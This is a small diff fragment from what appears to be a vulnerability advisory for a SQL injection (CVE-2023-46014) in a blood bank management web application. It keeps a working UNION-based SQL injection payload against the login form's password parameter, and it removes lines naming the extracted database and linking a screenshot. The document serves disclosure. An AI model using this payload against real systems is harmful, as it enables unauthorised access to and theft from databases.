@@ -64,6 +64,3 @@ Parameter: hpassword (POST)
     Payload: hemail=test@test&hpassword=test' UNION ALL SELECT NULL,CONCAT(0x716a7a6b71,0x5271514f636f6f46476f6365424b6e6166454c725751704d6f6c467968626a4e725172785955416d,0x7170767a71),NULL,NULL,NULL,NULL-- -&hlogin=Login
 ---
 ```
-
-+ current database: `bloodbank`
-<img width="1447" alt="image" src="https://github.com/ersinerenler/CVE-2023-46014-Code-Projects-Blood-Bank-1.0-SQL-Injection-Vulnerability/assets/113091631/2d932b0a-4a01-4064-9b08-607204433d10">
